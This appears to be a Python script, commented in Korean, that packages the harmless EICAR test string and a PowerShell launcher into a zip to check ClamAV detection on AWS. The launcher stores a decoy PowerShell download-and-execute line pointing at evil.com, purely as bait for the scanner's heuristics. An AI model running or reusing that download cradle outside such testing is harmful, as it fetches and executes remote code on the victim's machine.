import zipfile
import base64
import os

# 1. EICAR 테스트 문자열
raw_payload = r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
encoded_payload = base64.b64encode(raw_payload.encode()).decode()

def create_aws_clamav_test_zip(zip_filename):
    # 2. ClamAV가 의심스럽게 볼 만한 파워쉘 키워드들을 포함 (IEX, DownloadString 등)
    # 실제 동작은 하지 않지만, 시그니처 스캐너를 자극합니다.
    launcher_script = f"""
# AWS-ClamAV Detection Test Script
# Warning: This script contains suspicious patterns.

$b64 = "{encoded_payload}"
$plain = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($b64))

# ClamAV의 휴리스틱 엔진을 자극하기 위한 가짜 명령어 패턴들
$irrelevant = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')" 
Write-Host "Decoding test payload for AWS-ClamAV..."
Write-Host "Result: $plain"
"""
    
    print(f"AWS-ClamAV 탐지용 [{zip_filename}] 생성 중...")
    
    try:
        with zipfile.ZipFile(zip_filename, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
            # 파일을 2개 넣어서 ClamAV가 압축 해제 검사를 더 꼼꼼히 하게 만듦
            zf.writestr("launcher.ps1", launcher_script)
            # 확실한 탐지를 위해 원본 EICAR를 텍스트 파일로 하나 더 추가
            zf.writestr("signature.txt", raw_payload)
            
        print(f"✅ 생성 완료: {zip_filename}")
        print("💡 특징: 시그니처 노출과 의심 코드를 조합하여 탐지율을 극대화했습니다.")
        
    except Exception as e:
        print(f"❌ 오류: {e}")

if __name__ == "__main__":
    create_aws_clamav_test_zip("aws_clamav_test.zip")
